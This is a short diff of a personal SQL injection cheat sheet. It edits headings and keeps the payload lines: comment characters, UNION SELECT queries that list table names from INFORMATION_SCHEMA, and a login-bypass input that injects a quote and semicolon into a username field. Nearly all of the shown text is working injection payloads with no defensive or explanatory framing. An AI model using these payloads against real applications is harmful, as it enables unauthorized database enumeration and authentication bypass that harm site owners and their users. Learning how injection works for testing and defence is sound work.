@@ -1,4 +1,4 @@
-# For SQLi (SQLite)
+# SQLi 
 Command characters are (#, /**/, ;, —)
 
 We can use the following code to make it true
@@ -11,7 +11,6 @@ We can use the following code to make it true
 #### 0+UNION+SELECT+2,group_concat(table_name),3,4+from+INFORMATION_SCHEMA.TABLES
 #### 0+UNION+SELECT+2,3,group_concat(table_name),4+from+INFORMATION_SCHEMA.tables+where+table_SCHEMA=database()
 ..............................................................................
-# For SQLi (SQLite)
 
 user=admin' ;&pass=a 
 
